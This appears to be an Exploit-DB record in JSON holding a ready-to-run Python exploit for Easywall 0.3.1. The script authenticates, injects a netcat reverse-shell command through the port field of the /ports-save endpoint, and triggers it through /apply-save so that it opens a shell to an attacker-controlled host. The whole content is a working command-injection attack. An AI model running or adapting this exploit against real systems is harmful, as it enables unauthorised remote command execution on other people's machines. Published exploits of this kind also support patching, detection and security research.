{"source": "https://www.exploit-db.com/exploits/51856", "vulnName": "Easywall 0.3.1 - Authenticated Remote Command Execution", "vulnEDBID": "51856", "vulnCVE": "N/A", "author": "MELVIN MEJIA", "exploitType": "WEBAPPS", "platform": "MULTIPLE", "datePublished": "2024-03-03", "vulnContent": "# Exploit Title: Easywall 0.3.1 - Authenticated Remote Command Execution\n# Date: 30-11-2023\n# Exploit Author: Melvin Mejia\n# Vendor Homepage: https://jpylypiw.github.io/easywall/\n# Software Link: https://github.com/jpylypiw/easywall\n# Version: 0.3.1\n# Tested on: Ubuntu 22.04\n\nimport requests, json, urllib3\nurllib3.disable_warnings()\n\ndef exploit():\n    \n    # Replace values needed here\n    target_host = \"192.168.1.25\"\n    target_port= \"12227\"\n    lhost = \"192.168.1.10\"\n    lport = \"9001\"\n    user = \"admin\"\n    password = \"admin\"\n    \n    target = f\"https://{target_host}:{target_port}\"\n\n    # Authenticate to the app\n    print(\"[+] Attempting login with the provided credentials...\")\n    login_data = {\"username\":user, \"password\":password}\n    session = requests.session()\n    try:\n        login = session.post(f'{target}/login',data=login_data,verify=False)\n    except Exception as ex:\n        print(\"[!] There was a problem connecting to the app, error:\", ex)\n        exit(1)\n\n    if login.status_code != 200:\n        print(\"[!] Login failed.\")\n        exit(1)\n    else:\n        print(\"[+] Login successfull.\")    \n    \n    # Send the payload, the port parameter suffers from a command injection vulnerability\n    print(\"[+] Attempting to send payload.\")\n    rev_shell = f'/usr/bin/nc {lhost} {lport} -e bash #'\n    data = {\"port\":f\"123;{rev_shell}\", \"description\":\"\",\"tcpudp\":\"tcp\"}\n    send_payload = session.post(f\"{target}/ports-save\",data=data,verify=False)\n    if send_payload.status_code != 200:\n        print(\"[!] Failed to send payload.\")\n        exit(1)\n    else:\n        print(\"[+] Payload sent.\")\n\n    # Trigger the execution of the payload\n    print(\"[+] Attempting execution.\")\n    data = {\"step_1\":\"\", \"step_2\":\"\"}\n    execute = session.post(f\"{target}/apply-save\",data=data, verify=False)\n    if execute.status_code != 200:\n        print(\"[!] Attempt to execute failed.\")\n        exit(1)\n    else:\n        print(f\"[+] Execution succeded, you should have gotten a shell at {lhost}:{lport}.\")\n\nexploit()\n            "}